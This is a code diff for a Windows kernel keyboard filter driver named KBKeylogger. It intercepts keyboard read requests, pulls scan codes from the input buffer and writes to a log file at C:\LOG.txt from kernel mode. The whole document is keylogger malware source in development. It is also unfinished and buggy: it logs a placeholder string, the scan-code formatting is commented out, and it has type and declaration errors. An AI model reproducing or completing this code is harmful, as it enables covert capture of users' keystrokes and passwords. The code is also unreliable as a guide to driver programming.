@@ -1,9 +1,7 @@
-
-
 #include "KBKeylogger.h"
-LPCWSTR			defShadowText = L"test";
+
+WCHAR			*defShadowText = "test";
 WCHAR			*shadowText;
-int temp = 0;
 NTSTATUS DriverEntry (PDRIVER_OBJECT, PUNICODE_STRING);
 
 #ifdef ALLOC_PRAGMA
@@ -11,7 +9,6 @@ NTSTATUS DriverEntry (PDRIVER_OBJECT, PUNICODE_STRING);
 #pragma alloc_text (PAGE, AddDevice)
 #pragma alloc_text (PAGE, KBKeyloggerRead)
 #pragma alloc_text (PAGE, KBKeyloggerCreateClose)
-#pragma alloc_text (PAGE, IoCtl)
 #pragma alloc_text (PAGE, KBKeyloggerInternIoCtl)
 #pragma alloc_text (PAGE, Unload)
 #pragma alloc_text (PAGE, KBKeyloggerDispatchPassThrough)
@@ -35,7 +32,7 @@ DriverEntry (
         DriverObject->MajorFunction[i] = KBKeyloggerDispatchPassThrough;
     }
 
-	DriverObject->MajorFunction[IRP_MJ_READ] = KBKeyloggerRead;
+	DriverObject->MajorFunction[IRP_MJ_READ] =			KBKeyloggerRead;
     DriverObject->MajorFunction [IRP_MJ_CREATE] =
     DriverObject->MajorFunction [IRP_MJ_CLOSE] =        KBKeyloggerCreateClose;
     DriverObject->MajorFunction [IRP_MJ_PNP] =          KBKeyloggerPnP;
@@ -101,43 +98,39 @@ AddDevice(
     device->Flags &= ~DO_DEVICE_INITIALIZING;
 
 
-	NTSTATUS fi;
-	RtlInitUnicodeString(&TestName, L"\\??\\C:\\LOG.txt");
-	InitializeObjectAttributes(&ObjAttr, &TestName,
-		OBJ_CASE_INSENSITIVE,
-		0, NULL);
-	FileStatus = ZwCreateFile(&TestFile,
-		GENERIC_WRITE,
-		&ObjAttr,
+	NTSTATUS createFileStatus;
+	NTSTATUS closeStatus;
+	RtlInitUnicodeString(&logNameFile, L"\\??\\C:\\LOG.txt");
+	InitializeObjectAttributes(&ObjAttr, &logNameFile,
+		0, NULL, NULL);
+	createFileStatus = ZwCreateFile(&hLogFile, GENERIC_WRITE, &ObjAttr,
 		&IoStatus, NULL,
-		FILE_ATTRIBUTE_NORMAL,
-		0,
-		FILE_OVERWRITE_IF,
-		FILE_SYNCHRONOUS_IO_NONALERT,
+		FILE_ATTRIBUTE_NORMAL, 0,
+		FILE_OVERWRITE_IF, FILE_SYNCHRONOUS_IO_NONALERT,
 		NULL, 0);
-	if (FileStatus != STATUS_SUCCESS)
+
+	if (createFileStatus != STATUS_SUCCESS)
 	{
-		fi = FileStatus;
-		DbgPrint("omg");
+		DbgPrint("Can not create file!\n");
 	}
-	ZwClose(TestFile);
+
+	closeStatus = ZwClose(hLogFile);
+	if (closeStatus != STATUS_SUCCESS)
+	{
+		DbgPrint("Can not close file!\n");
+	}
     return status;
 }
 
-
-
-
 NTSTATUS ReadCompletion(
-	IN PDEVICE_OBJECT DeviceObject,
-	IN PIRP Irp,
-	IN PVOID Context
+	IN PDEVICE_OBJECT	DeviceObject,
+	IN PIRP				Irp,
+	IN PVOID			Context
 	)
 {
-	PKEYBOARD_INPUT_DATA KeyData;
 	ULONG KeyCount;
 	ULONG i;
 	
-	NTSTATUS er;
 	if (Irp->IoStatus.Status == STATUS_SUCCESS)
 	{
 		KeyData = (PKEYBOARD_INPUT_DATA)Irp->AssociatedIrp.SystemBuffer;
@@ -145,29 +138,8 @@ NTSTATUS ReadCompletion(
 
 		for (i = 0; i < KeyCount; i++)
 		{
-			/*RtlInitUnicodeString(&buf, L"S");
-			ZwQueryInformationFile(TestFile, &IoStatus, &FileInfo,
-				sizeof(FILE_STANDARD_INFORMATION), FileStandardInformation);*/
-			ZwCreateFile(&TestFile,
-				GENERIC_WRITE,
-				&ObjAttr,
-				&IoStatus, NULL,
-				FILE_ATTRIBUTE_NORMAL,
-				0,
-				FILE_OVERWRITE_IF,
-				FILE_SYNCHRONOUS_IO_NONALERT,
-				NULL, 0);
-			shadowText = ExAllocatePool(NonPagedPool, (wcslen(defShadowText) + 1) * sizeof(WCHAR));
-			RtlZeroMemory(shadowText, (wcslen(defShadowText) + 1) * sizeof(WCHAR));
-			RtlCopyMemory(shadowText, defShadowText, (wcslen(defShadowText) + 1) * sizeof(WCHAR));
-			er = ZwWriteFile(TestFile,
-				NULL, NULL, NULL,
-				&IoStatus,
-				shadowText,
-				wcslen(shadowText) * sizeof(WCHAR),
-				NULL, NULL);
-			ExFreePool(shadowText);
-			ZwClose(TestFile);
+			scanCode = KeyData[i].MakeCode;		
+		
 		}
 	}
 
@@ -186,17 +158,42 @@ KBKeyloggerRead(
     IN PIRP             Irp
     )
 {
-		ObReferenceObject(DeviceObject);
-		InterlockedIncrement((PLONG)&gSysEnters);
+	ObReferenceObject(DeviceObject);
+	InterlockedIncrement((PLONG)&gSysEnters);
 
-		IoCopyCurrentIrpStackLocationToNext(Irp);
-		IoSetCompletionRoutine(Irp, ReadCompletion, NULL, TRUE, TRUE, TRUE);	
-	
+	IoCopyCurrentIrpStackLocationToNext(Irp);
+	IoSetCompletionRoutine(Irp, ReadCompletion, NULL, TRUE, TRUE, TRUE);	
+
+	NTSTATUS openFileStatus = STATUS_SUCCESS;
+	NTSTATUS writeFileStatus = STATUS_SUCCESS;
+	openFileStatus = ZwCreateFile(&hLogFile, GENERIC_WRITE | FILE_APPEND_DATA, &ObjAttr,
+		&IoStatus, NULL,
+		FILE_ATTRIBUTE_NORMAL, 0,
+		FILE_OVERWRITE_IF, FILE_SYNCHRONOUS_IO_NONALERT,
+		NULL, 0);
+
+
+/*shadowText = ExAllocatePool(NonPagedPool, NTSTRSAFE_MAX_CCH * sizeof(WCHAR));
+defShadowText = ExAllocatePool(NonPagedPool, NTSTRSAFE_MAX_CCH * sizeof(WCHAR));
+RtlZeroMemory(shadowText, NTSTRSAFE_MAX_CCH * sizeof(WCHAR));
+RtlZeroMemory(defShadowText, NTSTRSAFE_MAX_CCH * sizeof(WCHAR));
+RtlStringCbVPrintfW(defShadowText, NTSTRSAFE_MAX_CCH * sizeof(WCHAR), L"%u ", scanCode);
+RtlCopyMemory(shadowText, defShadowText, NTSTRSAFE_MAX_CCH * sizeof(WCHAR));
+*/
+	shadowText = ExAllocatePool(NonPagedPool, (wcslen(defShadowText) + 1) * sizeof(WCHAR));
+	RtlZeroMemory(shadowText, (wcslen(defShadowText) + 1) * sizeof(WCHAR));
+	RtlCopyMemory(shadowText, defShadowText, (wcslen(defShadowText) + 1) * sizeof(WCHAR));
+	writeFileStatus = ZwWriteFile(hLogFile,
+				NULL, NULL, NULL,
+				&IoStatus,
+				shadowText,
+				wcslen(shadowText) * sizeof(WCHAR),
+				NULL, NULL);
+	ExFreePool(shadowText);
+	ZwClose(hLogFile);
+
 	return IoCallDriver(((PDEVICE_EXTENSION)DeviceObject->DeviceExtension)->TopOfStack, Irp);
-
 }
-
-
 
 NTSTATUS
 Complete(
@@ -507,7 +504,6 @@ KBKeyloggerPnP(
         IoSkipCurrentIrpStackLocation(Irp);
         status = IoCallDriver(devExt->TopOfStack, Irp);
 		
-		ZwClose(TestFile);
         IoDetachDevice(devExt->TopOfStack); 
         IoDeleteDevice(DeviceObject);
 
